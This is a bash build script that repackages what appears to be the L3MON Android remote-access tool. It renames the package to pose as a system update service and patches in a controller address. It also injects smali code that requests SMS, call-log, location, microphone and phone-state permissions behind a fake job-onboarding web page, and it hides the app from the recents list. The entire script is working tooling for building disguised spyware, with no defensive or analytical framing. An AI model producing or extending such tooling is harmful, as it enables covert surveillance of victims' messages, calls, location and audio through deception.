#!/bin/bash
set -e

OLD_PKG="com.etechd.l3mon"
NEW_PKG="com.sys.update.svc"
OLD_PATH="com/etechd/l3mon"
NEW_PATH="com/sys/update/svc"

# 1. Package Rename
OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

mkdir -p "payload_source/smali/$NEW_PATH"
if [ -d "payload_source/smali/$OLD_PATH" ]; then
    mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
    rm -rf "payload_source/smali/com/etechd"
fi

# 2. Update SDK
sed -i 's/targetSdkVersion: .*/targetSdkVersion: 30/g' payload_source/apktool.yml
sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="30"/g' payload_source/AndroidManifest.xml

# 3. Patch IP
chmod +x patch_payload.sh
sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
./patch_payload.sh

# 4. Create Lure (Fixed Smali Semicolons)
cat > lure.smali <<LURE
    const/4 v0, 0x7
    new-array v0, v0, [Ljava/lang/String;
    const/4 v1, 0x0
    const-string v2, "android.permission.READ_SMS"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "android.permission.RECEIVE_SMS"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "android.permission.READ_CALL_LOG"
    aput-object v2, v0, v1
    const/4 v1, 0x3
    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
    aput-object v2, v0, v1
    const/4 v1, 0x4
    const-string v2, "android.permission.RECORD_AUDIO"
    aput-object v2, v0, v1
    const/4 v1, 0x5
    const-string v2, "android.permission.POST_NOTIFICATIONS"
    aput-object v2, v0, v1
    const/4 v1, 0x6
    const-string v2, "android.permission.READ_PHONE_STATE"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    new-instance v0, Landroid/webkit/WebView;
    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
    move-result-object v1
    const/4 v2, 0x1
    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
LURE

# 5. Inject (Fixed address match with semicolon)
sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
sed -i "s|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|# Original UI disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"

# 6. Disable Loop
sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"

# 7. Manifest Update (Simplified)
sed -i "s|$NEW_PKG.MainActivity|$NEW_PKG.MainActivity\" android:excludeFromRecents=\"true\"|g" payload_source/AndroidManifest.xml
